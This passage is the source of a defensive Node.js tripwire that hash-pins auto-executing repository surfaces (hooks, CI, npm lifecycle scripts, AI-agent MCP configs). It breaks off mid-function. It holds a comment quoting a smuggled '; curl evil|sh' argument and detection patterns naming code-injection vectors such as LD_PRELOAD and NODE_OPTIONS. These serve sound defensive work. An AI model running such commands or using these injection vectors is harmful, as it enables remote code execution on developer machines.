#!/usr/bin/env node
/**
 * Supply-chain surface guard (tripwire) — portable, zero-dependency.
 *
 * Defends a repo against a persistence/supply-chain attack that re-runs itself by
 * hooking every AUTO-EXECUTION surface (lifecycle + CI scripts AND the files they
 * invoke, git hooks, GitHub workflows + composite actions, the Claude / Cursor /
 * Gemini-CLI / Codex / Hermes agent surfaces — MCP servers, hooks, rules/skills/
 * commands — editor tasks, dropped payloads). Runs in BOTH the pre-commit hook
 * and a CI job.
 *
 * MODEL — content PINNING. The exact (EOL-normalized) SHA-256 of every file under
 * a surface dir, plus the full package.json `scripts` block, is pinned in
 * security/surface-pins.json; the guard fails on ANY deviation, ANY new file, or a
 * lifecycle script that invokes an UNPINNED file. Heuristic checks (oversized /
 * minified blob, MCP servers, hooks, editor tasks) add defense in depth over the
 * trees that can't be byte-pinned (lib/, app/, …).
 *
 * FAIL-CLOSED: the optional security/guard.config.json can only make the guard
 * STRICTER — it must be a TRACKED file (an untracked/gitignored config is IGNORED
 * and flagged); coverage lists are UNIONed with the defaults (never shrunk),
 * maxFileBytes can only drop, mcpAllowlist additions are validated, and
 * oversizeAllowlist is NOT user-widenable (widening it would exempt a payload). The
 * config + pins live under security/, a pinned + code-owned surface, so it cannot
 * silently disarm the guard.
 *
 * ── DROP INTO ANY REPO ──
 *     cp scripts/guard-surfaces.mjs <repo>/scripts/
 *     cd <repo> && node scripts/guard-surfaces.mjs --init
 *     node scripts/guard-surfaces.mjs            # check (CI / pre-commit)
 *     node scripts/guard-surfaces.mjs --update   # re-pin after a legit change
 *     node scripts/guard-surfaces.mjs --global [--update]   # machine-local config drift
 *
 * CI runs the guard CODE from a TRUSTED ref (the base branch), not the PR head, so a
 * PR can't weaken the guard LOGIC. The PINS are read from the PR head, so a re-pinned
 * trojan is stopped by the CODEOWNERS review gate on security/ (keep it ON), not by
 * CI — see .github/workflows/test.yml and SECURITY.md.
 *
 * Pure helpers are exported for unit tests; fs/git/process live in the runner.
 */

import {
  readFileSync,
  existsSync,
  statSync,
  readdirSync,
  writeFileSync,
  mkdirSync,
  chmodSync,
} from "fs";
import { join, basename, relative, sep, dirname } from "path";
import { homedir } from "os";
import { pathToFileURL } from "url";
import { createHash } from "crypto";
import { execFileSync } from "child_process";

const PINS_PATH = "security/surface-pins.json";
const CONFIG_PATH = "security/guard.config.json";
const GLOBAL_BASELINE = ".stoa/global-baseline.json"; // machine-local (under ~)

/** Tunable surface definitions. Override via security/guard.config.json — but
 * overrides can only WIDEN coverage / TIGHTEN limits (see sanitizeConfig). */
const DEFAULTS = {
  // Dirs whose EVERY file is byte-pinned (husky's _/ cache + the pins manifest
  // are excluded). No extension allowlist — an attacker controls the extension.
  // Agent surfaces: .claude/.cursor/.gemini/.codex/.agents cover Claude, Cursor &
  // Gemini-CLI hooks, MCP config and rules/skills/commands — incl. Cursor's
  // hooks.json (auto-runs on workspaceOpen, no approval) and the cross-tool
  // .codex/skills + .agents/skills roots Cursor auto-loads. Gemini folder-trust
  // is OFF by default, so a committed .gemini/ auto-execs with NO gate.
  surfaceDirs: ["scripts", ".husky", ".github", ".claude", ".cursor", ".gemini", ".codex", ".agents", "security"],
  // Individual ROOT-level files to byte-pin (legacy single-file rule/instruction
  // surfaces that live outside any surface dir). Auto-injected into the agent →
  // a prompt-injection vector, so pin them like any other auto-run surface.
  surfaceFiles: [".cursorrules", ".windsurfrules"],
  // Source extensions scanned for obfuscation in the repo-wide payload sweep.
  scriptExts: [
    ".js", ".mjs", ".cjs", ".ts", ".mts", ".cts", ".sh", ".bash", ".zsh",
    ".fish", ".ps1", ".psm1", ".bat", ".cmd", ".py", ".rb", ".pl", ".php", ".lua",
  ],
  skipDirs: ["node_modules", ".git", ".next", "dist", "build", "coverage"],
  maxFileBytes: 1_000_000,
  oversizeAllowlist: ["package-lock.json", "pnpm-lock.yaml", "yarn.lock"],
  // An MCP server is allowed only if a path-segment of its command/args (sans
  // extension) EXACTLY equals an allowlist entry — see isAllowedMcpServer.
  mcpAllowlist: ["orchestration-server"],
  // Dirs whose *.json files are parsed for MCP servers + hooks (structured scan).
  // .cursor → .cursor/mcp.json; .gemini → .gemini/settings.json.
  agentConfigDirs: [".claude", ".cursor", ".gemini"],
  agentConfigFiles: [".mcp.json", ".claude.json"],
  localConfigFiles: [".claude/settings.local.json", ".mcp.json", ".claude.json"],
  globalTargets: [
    ".codex/config.toml",
    ".hermes/config.toml",
    ".claude.json",
    ".claude/settings.json",
    ".cursor/mcp.json",
    ".cursor/hooks.json", // Cursor global hooks — auto-run on lifecycle events, no approval
    ".gemini/settings.json",
  ],
};

// npm scripts that run AUTOMATICALLY on install/publish/pack — the file each one
// invokes must itself be pinned (a string-only check lets a trojaned target slip).
const LIFECYCLE_SCRIPTS = new Set([
  "preinstall", "install", "postinstall", "preprepare", "prepare", "postprepare",
  "prepublish", "prepublishOnly", "prepack", "postpack", "dependencies",
]);

const SHELL_CMDS = new Set([
  "sh", "bash", "zsh", "dash", "ksh", "fish", "cmd", "cmd.exe",
  "powershell", "powershell.exe", "pwsh", "pwsh.exe",
]);

// Interpreter flags that run arbitrary code BEFORE/instead of the main script
// (inline-eval AND module-preload — the latter, -r/--require/--import/--loader,
// runs an attacker module's top level before main). A standalone token only.
const CODE_LOAD_FLAG =
  /(^|\s)(-e|--eval|-p|--print|-c|-r|--require|--import|--loader|--experimental-loader)(\s|=|$)/;

// Env vars that inject code into a spawned interpreter regardless of argv.
const DANGEROUS_ENV =
  /^(NODE_OPTIONS|NODE_REPL_EXTERNAL_MODULE|BUN_INSPECT|DENO_|LD_PRELOAD|LD_AUDIT|DYLD_INSERT_LIBRARIES|DYLD_FRAMEWORK_PATH|PYTHONSTARTUP|PYTHONPATH|PERL5OPT|RUBYOPT)$/i;

const META_RE = /[;&|`$(){}<>#\n]|&&|\|\|/; // shell metachars / chaining / comment

// ── pure helpers (unit-tested) ──

export function sha256(content) {
  return createHash("sha256").update(content).digest("hex");
}

/** EOL-normalized content hash — pins must be identical across CRLF (Windows) and
 * LF (Linux/macOS CI) checkouts, else a clean PR false-fails on the enforcing OS. */
export function hashContent(content) {
  return sha256(String(content).replace(/\r\n/g, "\n"));
}

/** Extension from the BASENAME (so a dotted dir like .husky doesn't poison it). */
export function extOf(file) {
  const base = basename(file);
  const dot = base.lastIndexOf(".");
  return dot > 0 ? base.slice(dot) : "";
}

/** MCP server definitions in an agent config (`mcpServers` / `mcp_servers`). */
export function findMcpServers(obj) {
  const out = [];
  if (!obj || typeof obj !== "object") return out;
  for (const mapKey of ["mcpServers", "mcp_servers"]) {
    const map = obj[mapKey];
    if (!map || typeof map !== "object" || Array.isArray(map)) continue;
    for (const [name, def] of Object.entries(map)) {
      const isObj = def && typeof def === "object";
      const command = isObj && typeof def.command === "string" ? def.command : "";
      // args may be an ARRAY or a raw STRING — accept both. (Coercing a string to
      // "" let `{command:"ok",args:"; curl evil|sh"}` skip the metachar check.)
      const args = isObj
        ? Array.isArray(def.args)
          ? def.args.join(" ")
          : typeof def.args === "string"
            ? def.args
            : ""
        : "";
      // env can smuggle code into a spawned interpreter (NODE_OPTIONS=--require …).
      const env = isObj && def.env && typeof def.env === "object" && !Array.isArray(def.env) ? def.env : {};
      out.push({ name, command, args, env });
    }
  }
  return out;
}

/**
 * STRUCTURED allow check (not a raw substring): an MCP server is allowed only if
 *   - its command is not a shell (sh/bash/cmd/powershell/…),
 *   - the command line has no shell metacharacters / chaining / comments,
 *   - no interpreter code-load flag (-e/-p/-c/-r/--require/--import/--loader),
 *   - no code-injecting env var (NODE_OPTIONS / LD_PRELOAD / …), AND
 *   - some allowlist entry EXACTLY equals the BASENAME (sans extension) of the
 *     command or an arg — NOT an intermediate directory segment (else
 *     `node /tmp/orchestration-server/evil.js` would be allowed by the dir name).
 * This blocks substring decoys, typosquats, comment-smuggling, shell/preload
 * wrappers, and directory-name spoofing.
 */
export function isAllowedMcpServer({ command, args, env } = {}, allowlist) {
  const cmd = String(command || "").trim();
  const a = String(args || "").trim();
  if (META_RE.test(`${cmd} ${a}`)) return false; // metachars / chaining / comment
  if (SHELL_CMDS.has(basename(cmd).toLowerCase())) return false;
  if (CODE_LOAD_FLAG.test(` ${a} `)) return false; // inline-eval / module-preload
  for (const [k, v] of Object.entries(env && typeof env === "object" ? env : {})) {
    if (DANGEROUS_ENV.test(k)) return false;
    if (typeof v === "string" && (META_RE.test(v) || CODE_LOAD_FLAG.test(` ${v} `))) return false;
  }
  // BASENAME of each whitespace token only — directory segments don't count.
  const bases = [cmd, ...a.split(/\s+/)]
    .filter(Boolean)
    .map((t) => basename(t).replace(/\.[^.]+$/, ""))
    .filter(Boolean);
  return (allowlist || []).some((allow) => bases.includes(allow));
}

/** Back-compat default for Stoa's own orchestration MCP server. */
export function isStoaMcpServer(server) {
  return isAllowedMcpServer(server, DEFAULTS.mcpAllowlist);
}

/** Recursively locate any `hooks` key in a parsed JSON object (Claude/MCP). */
export function findHooksKeys(obj, path = "") {
  const found = [];
  if (!obj || typeof obj !== "object") return found;
  for (const [key, val] of Object.entries(obj)) {
    if (key === "hooks") found.push(`${path}${key}`);
    if (val && typeof val === "object") found.push(...findHooksKeys(val, `${path}${key}.`));
  }
  return found;
}

/** Obfuscation signal: a very long single line OR a high AVERAGE line length. */
export function isLikelyMinified(content, maxLineLength = 5000, maxAvgLineLength = 1000) {
  if (!content) return false;
  let maxLine = 0, lines = 1, cur = 0;
  for (let i = 0; i < content.length; i++) {
    if (content[i] === "\n") {
      if (cur > maxLine) maxLine = cur;
      lines++;
      cur = 0;
    } else cur++;
  }
  if (cur > maxLine) maxLine = cur;
  if (maxLine > maxLineLength) return true;
  return content.length / lines > maxAvgLineLength;
}

/** Deep-compare the live package.json scripts to the pinned scripts object. */
export function checkPackageScripts(pkg, pinnedScripts) {
  const violations = [];
  const live = (pkg && pkg.scripts) || {};
  const pinned = pinnedScripts || {};
  for (const [name, cmd] of Object.entries(live)) {
    if (!(name in pinned)) violations.push(`package.json: new script "${name}": ${cmd}`);
    else if (pinned[name] !== cmd)
      violations.push(`package.json: script "${name}" changed → "${cmd}" (pinned: "${pinned[name]}")`);
  }
  for (const name of Object.keys(pinned))
    if (!(name in live)) violations.push(`package.json: script "${name}" removed`);
  return violations;
}

/** Local file paths (with a script extension) invoked by a script command.
 * Case-insensitive: on Windows / default macOS, `node tools/Run.JS` executes. */
export function scriptFileTargets(cmd) {
  const re = /(?:^|[\s;&|=("'`])((?:\.{0,2}\/)?[\w./\\-]+\.(?:js|mjs|cjs|ts|mts|cts|sh|bash|zsh|py|rb|ps1|psm1|bat|cmd|pl|php|lua))/gi;
  const out = [];
  let m;
  while ((m = re.exec(String(cmd))) !== null) {
    out.push(m[1].replace(/^\.\//, "").split("\\").join("/"));
  }
  return out;
}

/** Files under the surface dirs (or an exact-match root surfaceFile) that should
 * be byte-pinned (excludes husky's _/ cache and the pins manifest itself, which
 * cannot pin its own hash). */
export function discoverSurfaceFiles(relFiles, surfaceDirs, surfaceFiles = []) {
  // Case-INSENSITIVE matching: on macOS APFS / Windows NTFS (both supported, both
  // case-insensitive by default), an agent loads `.Cursor/hooks.json` identically
  // to `.cursor/`, so case-exact matching would let a case-folded surface evade
  // the byte-pin entirely. Compare lowercased; keep the original rel for hashing.
  const roots = new Set(surfaceFiles.map((f) => f.toLowerCase()));
  const dirsLc = surfaceDirs.map((d) => d.toLowerCase());
  const under = (rel) => {
    const lc = rel.toLowerCase();
    return roots.has(lc) || dirsLc.some((d) => lc === d || lc.startsWith(d + "/"));
  };
  return relFiles
    .filter((f) => under(f) && !f.toLowerCase().startsWith(".husky/_/") && f !== PINS_PATH)
    .sort();
}

// ── config + fs / git ──

function readText(root, rel) {
  try {
    return readFileSync(join(root, rel), "utf-8");
  } catch {
    return null;
  }
}

function readJson(text) {
  try {
    return { ok: true, value: JSON.parse(text) };
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : String(e) };
  }
}

const uniq = (arr) => [...new Set(arr)];
const asArr = (v) => (Array.isArray(v) ? v.filter((x) => typeof x === "string") : []);

/** Validate an mcpAllowlist entry: long enough + no path/shell/metachar tokens. */
function safeAllowEntry(s) {
  return typeof s === "string" && s.length >= 4 && !/[\s/\\;&|`$(){}<>#.]/.test(s) && !SHELL_CMDS.has(s.toLowerCase());
}

/**
 * Load config FAIL-CLOSED: overrides can only widen coverage / tighten limits.
 * Coverage lists are UNIONed with the defaults (an attacker can't shrink them);
 * maxFileBytes can only decrease; mcpAllowlist additions are validated; skipDirs
 * can never include a surfaceDir.
 *
 * TRUST: the config is only honored if it is a TRACKED file (pass the `tracked`
 * set). An untracked / gitignored security/guard.config.json is IGNORED (it never
 * appears in CODEOWNERS-reviewed history and would otherwise be a silent foothold);
 * the caller is told via cfg.untrustedConfig and raises a violation. When `tracked`
 * is omitted (e.g. updatePins), the config is honored — but even then it cannot
 * DISARM the guard: oversizeAllowlist is NOT user-widenable (widening it would
 * exempt a payload from the oversize check), and every other override only widens
 * coverage or tightens a limit.
 */
export function loadConfig(root, { tracked } = {}) {
  const cfg = { ...DEFAULTS };
  const exists = existsSync(join(root, CONFIG_PATH));
  const untrusted = exists && tracked instanceof Set && !tracked.has(CONFIG_PATH);
  cfg.untrustedConfig = untrusted ? CONFIG_PATH : null;
  const text = exists && !untrusted ? readText(root, CONFIG_PATH) : null;
  const parsed = text ? readJson(text) : { ok: false };
  const raw = parsed.ok && raw_obj(parsed.value) ? parsed.value : {};

  cfg.surfaceDirs = uniq([...DEFAULTS.surfaceDirs, ...asArr(raw.surfaceDirs)]);
  cfg.surfaceFiles = uniq([...DEFAULTS.surfaceFiles, ...asArr(raw.surfaceFiles)]);
  cfg.scriptExts = uniq([...DEFAULTS.scriptExts, ...asArr(raw.scriptExts)]);
  // oversizeAllowlist is NOT user-widenable — adding a basename here would DISABLE
  // the >maxFileBytes payload check for that file (a disarm, not a widen).
  cfg.oversizeAllowlist = [...DEFAULTS.oversizeAllowlist];
  cfg.agentConfigDirs = uniq([...DEFAULTS.agentConfigDirs, ...asArr(raw.agentConfigDirs)]);
  cfg.agentConfigFiles = uniq([...DEFAULTS.agentConfigFiles, ...asArr(raw.agentConfigFiles)]);
  cfg.localConfigFiles = uniq([...DEFAULTS.localConfigFiles, ...asArr(raw.localConfigFiles)]);
  cfg.globalTargets = uniq([...DEFAULTS.globalTargets, ...asArr(raw.globalTargets)]);
  cfg.mcpAllowlist = uniq([...DEFAULTS.mcpAllowlist, ...asArr(raw.mcpAllowlist).filter(safeAllowEntry)]);
  // skipDirs may add dirs but NEVER a surface dir (would blind the scan).
  cfg.skipDirs = uniq([...DEFAULTS.skipDirs, ...asArr(raw.skipDirs)]).filter(
    (d) => !cfg.surfaceDirs.includes(d)
  );
  cfg.maxFileBytes =
    typeof raw.maxFileBytes === "number" && raw.maxFileBytes > 0
      ? Math.min(DEFAULTS.maxFileBytes, raw.maxFileBytes)
      : DEFAULTS.maxFileBytes;
  return cfg;
}

function raw_obj(v) {
  return v && typeof v === "object" && !Array.isArray(v);
}

function walkRel(root, skipDirs, dir = root, acc = []) {
  let entries;
  try {
    entries = readdirSync(dir, { withFileTypes: true });
  } catch {
    return acc;
  }
  for (const entry of entries) {
    if (entry.isDirectory()) {
      if (skipDirs.has(entry.name)) continue;
      walkRel(root, skipDirs, join(dir, entry.name), acc);
    } else {
      acc.push(relative(root, join(dir, entry.name)).split(sep).join("/"));
    }
  }
  return acc;
}

function gitList(root, extraArgs) {
  const out = execFileSync("git", ["-C", root, "ls-files", "-z", ...extraArgs], {
    encoding: "utf-8",
    maxBuffer: 64 * 1024 * 1024,
    stdio: ["ignore", "pipe", "ignore"],
  });
  return out.split("\0").filter(Boolean);
}

/** { files: tracked ∪ untracked-not-ignored, tracked: Set } — so a dropped but
 * not-yet-committed surface file is still scanned/pinnable, while advisory routing
 * (untracked local config → warning) still knows what's tracked. */
function listFiles(root, skipDirs) {
  try {
    const tracked = gitList(root, []);
    if (tracked.length) {
      let untracked = [];
      try {
        untracked = gitList(root, ["-o", "--exclude-standard"]);
      } catch {
        /* ignore */
      }
      return { files: uniq([...tracked, ...untracked]), tracked: new Set(tracked) };
    }
  } catch {
    /* not a git repo — fall through */
  }
  const walked = walkRel(root, skipDirs);
  return { files: walked, tracked: new Set(walked) };
}

/** Surface-file candidate set for pin/scan: the git list ∪ a DIRECT walk of each
 * surface dir (so a gitignored drop inside a surface dir — which `git ls-files`
 * omits — is still seen) ∪ any existing root surfaceFile. */
function surfaceCandidates(root, cfg, files, skipDirs) {
  const set = new Set(files);
  for (const d of cfg.surfaceDirs) {
    const abs = join(root, d);
    if (existsSync(abs)) for (const f of walkRel(root, skipDirs, abs)) set.add(f);
  }
  for (const f of cfg.surfaceFiles) if (existsSync(join(root, f))) set.add(f);
  return discoverSurfaceFiles([...set], cfg.surfaceDirs, cfg.surfaceFiles);
}

// ── runner ──

/** Scan a repo root. Returns { violations, warnings }. */
export function runGuard(root) {
  const violations = [];
  const warnings = [];
  // Enumerate first — the tracked set decides config trust + violation routing.
  // DEFAULT skipDirs here: the git path ignores them, and the walk fallback only
  // over-includes (fail-safe) if config later widens skipDirs.
  const { files, tracked } = listFiles(root, new Set(DEFAULTS.skipDirs));
  const cfg = loadConfig(root, { tracked });
  const skipDirs = new Set(cfg.skipDirs);
  const scriptExts = new Set(cfg.scriptExts.map((e) => e.toLowerCase()));
  const oversize = new Set(cfg.oversizeAllowlist);

  // 0. An untracked / gitignored guard config is IGNORED and is itself a violation
  //    (it can't be CODEOWNERS-reviewed, so it must not silently widen / foothold).
  if (cfg.untrustedConfig)
    violations.push(
      `${cfg.untrustedConfig}: untracked guard config IGNORED — it must be a tracked, code-owned file (commit it or remove it)`
    );

  // 1. package.json scripts vs the pin (whole block; covers test/build/all).
  const pinsParsed = (() => {
    const t = readText(root, PINS_PATH);
    return t ? readJson(t) : { ok: false };
  })();
  if (!pinsParsed.ok) {
    violations.push(`${PINS_PATH} missing or unparseable — run 'node scripts/guard-surfaces.mjs --init' (or --update)`);
    return { violations, warnings };
  }
  const pins = pinsParsed.value;
  const pinnedFiles = pins.files || {};
  const pkgText = readText(root, "package.json");
  if (pkgText) {
    const pkg = readJson(pkgText);
    if (pkg.ok) {
      violations.push(...checkPackageScripts(pkg.value, pins.packageScripts));
      // Couple the string-pin to the CONTENT of the file each LIFECYCLE script
      // invokes — a trojaned target with an unchanged command string slips by otherwise.
      const scripts = (pkg.value && pkg.value.scripts) || {};
      for (const name of Object.keys(scripts)) {
        if (!LIFECYCLE_SCRIPTS.has(name)) continue;
        for (const target of scriptFileTargets(scripts[name])) {
          if (existsSync(join(root, target)) && !(target in pinnedFiles))
            violations.push(`package.json: lifecycle script "${name}" runs UNPINNED file "${target}"`);
        }
      }
    } else violations.push("package.json: unparseable JSON");
  }

  // 2. Pinned surface files: byte-for-byte (EOL-normalized), any ext/size. The
  //    candidate set unions the git list with a DIRECT walk of each surface dir, so
  //    a gitignored drop in a surface dir (git ls-files omits it) is still SEEN.
  //    Routing: a TRACKED (committed) surface that's unpinned/changed is a VIOLATION
  //    (the committed-attack + legit-re-pin path); an UNTRACKED / gitignored one is
  //    an ADVISORY warning — it isn't in the committed tree (so it can't be a PR
  //    attack), just a local artifact worth surfacing. A CHANGED pin is always a
  //    violation (a known surface was tampered).
  const surface = surfaceCandidates(root, cfg, files, skipDirs);
  for (const rel of surface) {
    const content = readText(root, rel);
    if (content == null) continue;
    const hash = hashContent(content);
    if (!(rel in pinnedFiles))
      (tracked.has(rel) ? violations : warnings).push(
        tracked.has(rel)
          ? `${rel}: new unpinned executable surface file`
          : `${rel}: untracked/gitignored surface file (not pinned) — review it`
      );
    else if (pinnedFiles[rel] !== hash) violations.push(`${rel}: content changed from its pinned hash`);
  }
  for (const rel of Object.keys(pinnedFiles))
    if (!surface.includes(rel) && !existsSync(join(root, rel)))
      violations.push(`${rel}: pinned surface file is gone (moved/deleted?)`);

  // 3. Agent configs — hooks + MCP servers (Claude/Cursor/Gemini JSON; Codex/Hermes
  //    TOML is byte-pinned only, see SECURITY.md). Parse failure is itself a
  //    violation. Matching is case-INSENSITIVE (a tracked `.Cursor/mcp.json` loads
  //    identically on macOS/Windows). Tracked → violation; untracked local → advisory.
  const cfgFilesLc = new Set(cfg.agentConfigFiles.map((f) => f.toLowerCase()));
  const cfgDirsLc = cfg.agentConfigDirs.map((d) => d.toLowerCase());
  const configRels = new Set(cfg.agentConfigFiles);
  for (const rel of files) {
    const lc = rel.toLowerCase();
    if (cfgFilesLc.has(lc) || (cfgDirsLc.some((d) => lc.startsWith(d + "/")) && lc.endsWith(".json")))
      configRels.add(rel);
  }
  for (const localCfg of cfg.localConfigFiles)
    if (!tracked.has(localCfg) && existsSync(join(root, localCfg))) configRels.add(localCfg);
  for (const rel of configRels) {
    if (!existsSync(join(root, rel))) continue;
    const sink = tracked.has(rel) ? violations : warnings;
    const text = readText(root, rel);
    if (text == null) continue;
    const parsed = readJson(text);
    if (!parsed.ok) {
      sink.push(
        /"hooks"/.test(text)
          ? `${rel}: unparseable config that mentions "hooks" — possible obfuscated hook injection`
          : `${rel}: unparseable JSON config (could hide an injected hook from the scanner)`
      );
      continue;
    }
    const hooks = findHooksKeys(parsed.value);
    if (hooks.length)
      sink.push(`${rel}: contains hook definition(s) [${hooks.join(", ")}] — auto-executes on agent events`);
    for (const s of findMcpServers(parsed.value))
      if (!isAllowedMcpServer(s, cfg.mcpAllowlist))
        sink.push(
          `${rel}: defines MCP server "${s.name}" (command: ${`${s.command} ${s.args}`.trim()}) — auto-launches when a Claude/Cursor/Gemini/Codex/Hermes agent starts`
        );
  }

  // 4. Editor auto-run tasks.
  const tasksRel = ".vscode/tasks.json";
  if (existsSync(join(root, tasksRel)))
    (tracked.has(tasksRel) ? violations : warnings).push(`${tasksRel}: present — auto-runs in the editor`);

  // 5. Defense-in-depth payload sweep over the whole file set (lib/app/etc.).
  for (const rel of files) {
    if (rel.split("/").some((seg) => skipDirs.has(seg))) continue;
    let size = 0;
    try {
      size = statSync(join(root, rel)).size;
    } catch {
      continue;
    }
    if (size > cfg.maxFileBytes && !oversize.has(basename(rel))) {
      violations.push(`${rel}: ${(size / 1e6).toFixed(1)} MB — oversized; possible dropped payload`);
      continue;
    }
    if (scriptExts.has(extOf(rel).toLowerCase()) && size <= cfg.maxFileBytes) {
      const content = readText(root, rel);
      if (content != null && isLikelyMinified(content)) violations.push(`${rel}: minified/obfuscated source`);
    }
  }

  return { violations, warnings };
}

/** Regenerate security/surface-pins.json from the current tree. Pins only TRACKED
 * surface files — a committed manifest must not pin a local/untracked artifact (it
 * would read as "gone" on a fresh clone). Gitignored surface drops are intentionally
 * left unpinned, so the guard reports them as an advisory (see runGuard step 2). */
export function updatePins(root) {
  const { files, tracked } = listFiles(root, new Set(DEFAULTS.skipDirs));
  const cfg = loadConfig(root, { tracked });
  const skipDirs = new Set(cfg.skipDirs);
  const pkgText = readText(root, "package.json");
  const pkg = pkgText ? JSON.parse(pkgText) : {};
  const pinnedFiles = {};
  for (const rel of surfaceCandidates(root, cfg, files, skipDirs)) {
    if (!tracked.has(rel)) continue; // pin tracked surfaces only
    const content = readText(root, rel);
    if (content != null) pinnedFiles[rel] = hashContent(content);
  }
  const pins = {
    _comment:
      "Pinned auto-execution surfaces. Regenerate with: node scripts/guard-surfaces.mjs --update (a code-owned change — see .github/CODEOWNERS).",
    packageScripts: pkg.scripts || {},
    files: pinnedFiles,
  };
  const out = join(root, PINS_PATH);
  mkdirSync(dirname(out), { recursive: true });
  writeFileSync(out, JSON.stringify(pins, null, 2) + "\n");
  return pins;
}

// ── global agent-config drift (out-of-repo persistence; machine-local) ──

export function extractGlobalSurfaces(rel, content) {
  if (rel.endsWith(".json")) {
    const p = readJson(content);
    if (!p.ok) return { mcpServers: [], hooks: /"hooks"/.test(content), parseError: true };
    return { mcpServers: findMcpServers(p.value).map((s) => s.name).sort(), hooks: findHooksKeys(p.value).length > 0 };
  }
  // TOML (codex/hermes): table-header [mcp_servers.NAME] / [mcp_servers."N"], dotted
  // assignment mcp_servers.NAME = {...}, and inline-table mcp_servers = { NAME = ... }.
  const names = new Set();
  const head = /\[\s*(?:mcp_servers|mcp\.servers|mcpServers)\.(?:"([^"]+)"|([A-Za-z0-9_.-]+))\s*\]/g;
  const dotted = /(?:^|\n)\s*(?:mcp_servers|mcpServers)\.(?:"([^"]+)"|([A-Za-z0-9_.-]+))\s*=/g;
  for (const re of [head, dotted]) {
    let m;
    while ((m = re.exec(content)) !== null) names.add(m[1] || m[2]);
  }
  // inline table: mcp_servers = { a = { command="x" }, b = {...} }. Regex can't
  // balance nested braces (env sub-tables), so scan brace depth manually and take
  // the TOP-LEVEL keys (each `name = {…}` is one server) — the old [^}]* form
  // truncated at the first nested `}`, mis-naming servers and missing later ones.
  for (const body of inlineTableBodies(content)) {
    for (const part of splitTopLevel(body)) {
      const km = /^[\s,]*(?:"([^"]+)"|([A-Za-z0-9_.-]+))\s*=/.exec(part);
      if (km) names.add(km[1] || km[2]);
    }
  }
  return { mcpServers: [...names].sort(), hooks: /(^|\n)\s*\[?\s*hooks\b/i.test(content) };
}

/** Brace-balanced bodies of each `mcp_servers = { … }` inline TOML table. */
function inlineTableBodies(content) {
  const bodies = [];
  const start = /(?:^|\n)[ \t]*(?:mcp_servers|mcpServers)[ \t]*=[ \t]*\{/g;
  let m;
  while ((m = start.exec(content)) !== null) {
    let i = m.index + m[0].length; // just past the opening brace
    let depth = 1;
    const from = i;
    for (; i < content.length && depth > 0; i++) {
      if (content[i] === "{") depth++;
      else if (content[i] === "}") depth--;
    }
    bodies.push(content.slice(from, depth === 0 ? i - 1 : i));
  }
  return bodies;
}

/** Split a TOML inline-table body on DEPTH-0 commas (ignore commas inside nested
 * `{ … }` sub-tables), so each part is one top-level `name = value` assignment. */
function splitTopLevel(body) {
  const parts = [];
  let depth = 0, cur = "";
  for (const c of body) {
    if (c === "{") depth++;
    else if (c === "}") depth--;
    if (c === "," && depth === 0) {
      parts.push(cur);
      cur = "";
    } else cur += c;
  }
  if (cur.trim()) parts.push(cur);
  return parts;
}

function snapshotGlobal(home, targets) {
  const snap = {};
  for (const rel of targets) {
    const p = join(home, rel);
    if (!existsSync(p)) continue;
    let content;
    try {
      content = readFileSync(p, "utf-8");
    } catch {
      continue;
    }
    snap[rel] = { hash: hashContent(content), ...extractGlobalSurfaces(rel, content) };
  }
  return snap;
}

export function runGlobalGuard(home, targets = DEFAULTS.globalTargets) {
  const current = snapshotGlobal(home, targets);
  const baselinePath = join(home, GLOBAL_BASELINE);
  if (!existsSync(baselinePath)) return { needsBaseline: true, current };
  let baselineText;
  try {
    baselineText = readFileSync(baselinePath, "utf-8");
  } catch {
    return { needsBaseline: true, current };
  }
  const parsed = readJson(baselineText);
  if (!parsed.ok) return { needsBaseline: true, current };
  const baseline = parsed.value.files || {};
  const alerts = [];
  const notes = [];
  for (const rel of targets) {
    const was = baseline[rel];
    const now = current[rel];
    if (!was && now) {
      alerts.push(`${rel}: NEW global config since baseline (mcpServers: [${now.mcpServers.join(", ")}], hooks: ${now.hooks})`);
      continue;
    }
    if (was && !now) {
      notes.push(`${rel}: removed since baseline`);
      continue;
    }
    if (!was || !now) continue;
    const added = now.mcpServers.filter((n) => !was.mcpServers.includes(n));
    if (added.length) alerts.push(`${rel}: NEW MCP server(s) [${added.join(", ")}] — a global auto-launcher was added`);
    if (now.hooks && !was.hooks) alerts.push(`${rel}: a hooks block appeared`);
    // Any other content change is also an alert (a parser that can't name the
    // new server must NOT silently downgrade to an advisory note).
    if (now.hash !== was.hash && !added.length && !(now.hooks && !was.hooks))
      alerts.push(`${rel}: content changed since baseline — review for an injected MCP server / hook`);
  }
  return { alerts, notes, current };
}

export function writeGlobalBaseline(home, targets = DEFAULTS.globalTargets) {
  const snap = snapshotGlobal(home, targets);
  const out = join(home, GLOBAL_BASELINE);
  mkdirSync(dirname(out), { recursive: true });
  writeFileSync(
    out,
    JSON.stringify(
      { _comment: "Stoa global agent-config baseline. Re-baseline: node scripts/guard-surfaces.mjs --global --update", files: snap },
      null,
      2
    ) + "\n"
  );
  return snap;
}

// ── init (plug-and-play wiring for a new repo) ──

const CI_WORKFLOW = `name: surface-guard

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  surface-guard:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
        with:
          node-version: 20
      # Run the guard CODE from a TRUSTED ref (base branch), not the PR head, so a
      # PR cannot weaken the guard LOGIC and pass its own check. (Pins/config are
      # read from the PR head; a re-pinned trojan is blocked by the CODEOWNERS gate
      # on security/, so keep "Require review from Code Owners" ON.) Falls back to
      # the PR copy only to bootstrap (before the guard exists on the base branch).
      - run: |
          git fetch --no-tags --depth=1 origin "\${{ github.base_ref || 'main' }}" 2>/dev/null || true
          if git cat-file -e FETCH_HEAD:scripts/guard-surfaces.mjs 2>/dev/null; then
            git show FETCH_HEAD:scripts/guard-surfaces.mjs > "\${RUNNER_TEMP}/trusted-guard.mjs"
            node "\${RUNNER_TEMP}/trusted-guard.mjs"
          else
            node scripts/guard-surfaces.mjs
          fi
`;

function ensurePreCommit(root) {
  const line = "node scripts/guard-surfaces.mjs";
  if (existsSync(join(root, ".husky"))) {
    const hook = join(root, ".husky", "pre-commit");
    const cur = existsSync(hook) ? readFileSync(hook, "utf-8") : "";
    if (cur.includes("guard-surfaces.mjs")) return "pre-commit: already wired (husky)";
    writeFileSync(hook, (cur ? cur.replace(/\s*$/, "\n") : "") + line + "\n");
